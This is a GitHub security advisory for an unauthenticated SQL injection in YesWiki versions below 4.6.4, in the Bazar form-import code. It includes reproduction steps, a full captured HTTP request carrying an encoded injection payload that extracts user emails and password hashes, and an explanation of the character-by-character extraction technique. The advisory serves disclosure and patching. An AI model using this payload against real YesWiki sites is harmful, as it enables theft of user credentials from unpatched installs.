# [C] YesWiki: Unauthenticated SQL Injection

## Summary
Severity: Critical
Advisory: GHSA-jwvv-qr7q-cv8j
CVE: CVE-2026-46670
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-22
Source: https://github.com/advisories/GHSA-jwvv-qr7q-cv8j
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.6.4

## Details
### Summary

An unauthenticated SQL injection in the Bazar form-import path (`FormManager::create()`) allows any unauthenticated visitor of a default YesWiki install to inject arbitrary SQL into an `INSERT` statement and read the full database, including `yeswiki_users.password` hashes. Present in 4.6.1 / 4.6.2 / current `doryphore-dev`; analyzed against upstream commit `1f485c049db030b94c047ec219e63534ac81142e`.

### Details

Sink is at `FormManager::create()` (function at L232), unquoted concatenation of `bn_id_nature` into the `INSERT VALUES` list at https://github.com/YesWiki/yeswiki/blob/1f485c049db030b94c047ec219e63534ac81142e/tools/bazar/services/FormManager.php#L258 

Reachability is unauthenticated.


### PoC

1. Clone the repo (test was done on 1f485c049db030b94c047ec219e63534ac81142e)
2. Bring up the service using docker: `cd docker && docker compose build && docker compose up`
3. Go to `https://localhost:8085`
4. Go through the installation
5. Run the POC: 
[yeswiki_sqli_poc.py](https://github.com/user-attachments/files/27578633/yeswiki_sqli_poc.py)

<img width="672" height="54" alt="image" src="https://github.com/user-attachments/assets/fc9a9adf-7d09-442b-bcc1-8edf1bdcf0a1" />


### Impact
Sql injection.
An attacker can dump the whole db, including usernames, emails, and hashed passwords.


### More details
Sample http request (copied from burp):
```
POST /?BazaR&vue=formulaire HTTP/1.1
Accept-Encoding: gzip, deflate, br
Content-Length: 353
Host: localhost:8085
User-Agent: Python-urllib/3.13
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

imported-form%5B7791000%2BASCII%28SUBSTRING%28%28SELECT%2F%2A%2A%2FHEX%28CONCAT%28email%2C0x3a%2Cpassword%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2Fyeswiki_users%2F%2A%2A%2FLIMIT%2F%2A%2A%2F1%29%2C1%2C1%29%29%5D=%7B%22bn_label_nature%22%3A+%22zz_poc_7790000_1%22%2C+%22bn_template%22%3A+%22%22%2C+%22bn_description%22%3A+%22%22%2C+%22bn_condition%22%3A+%22%22%7D
```

#### POC internals:
The PoC uses an expression like:
`7330000 + ASCII(SUBSTRING((SELECT HEX(VERSION())), 1, 1))`

**Breakdown**
`SELECT HEX(VERSION())` or whatever the statement is (the poc file  dumps 1 username and password)
This gets the database version and hex-encodes it.
Example:
```
VERSION()      = 9.7.0
HEX(VERSION()) = 392E372E30
```
Then:
`SUBSTRING((SELECT HEX(VERSION())), 1, 1)` takes one character from that hex string. 
For position 1, this returns `3`, then: `ASCII(...)` converts that character to its ASCII code: `ASCII('3') = 51`
Then:
`7330000 + 51` produces `7330051`
So the full vulnerable insert becomes roughly:
```
INSERT INTO yeswiki_nature (..., bn_id_nature, ...)
VALUES (7330000 + ASCII(SUBSTRING((SELECT HEX(VERSION())), 1, 1)), "fr-FR", ...);
```
MySQL evaluates the expression before storing it, so the inserted row has: `bn_id_nature = 7330051`
The PoC reads that ID from `/?api/forms`, subtracts `7330000`, gets `51`, converts `51` back to '3', and repeats for the next character.

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-jwvv-qr7q-cv8j
- https://github.com/YesWiki/yeswiki
